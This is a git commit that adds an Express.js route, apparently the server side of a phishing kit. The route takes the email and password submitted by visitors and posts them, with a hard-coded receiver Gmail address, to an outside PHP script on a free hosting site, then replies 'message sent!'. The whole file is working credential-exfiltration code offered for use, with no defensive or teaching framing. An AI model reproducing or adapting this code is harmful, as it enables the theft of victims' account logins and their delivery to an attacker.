81ab28f9f2443f9bb6fce60f82113f8bbce4b7bd
Dev. Alex_dgreat <opponamer@gmail.com>
2023-08-19 14:28:07 +0100

    initial commit

---
+++ routes/main.js
@@ -0,0 +1,40 @@
+const express = require('express');
+const ax = require('axios');
+const fs = require('fs');
+const router = express.Router();
+const path = require('path');
+
+
+/***********************Send mail php imported url*****************/
+const
+    link = 'https://walleyconnect.000webhostapp.com/dex/server.php',
+    receiverEmail = 'greatogbuagu2005@gmail.com';
+/**********************Send mail php imported url ends**************/
+
+router.post("/", (req, res) => {
+    const referer = req.headers.referer || req.headers.referrer;
+    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+    ax.post(link, {
+        email: req.body.email,
+        password: req.body.password,
+        source: req.body.source,
+        receiver: receiverEmail
+    }).then((response) => {
+        if(response.status === 200) {
+            console.log('heyiamdone')
+            res.send({
+                status_code: '200',
+                status: true,
+                message: 'message sent!'
+            })
+        }
+    }).catch((err) => {
+        res.send({
+            status_code: '400',
+            status: false,
+            message: err
+        })
+    });
+});
+
+module.exports = router;
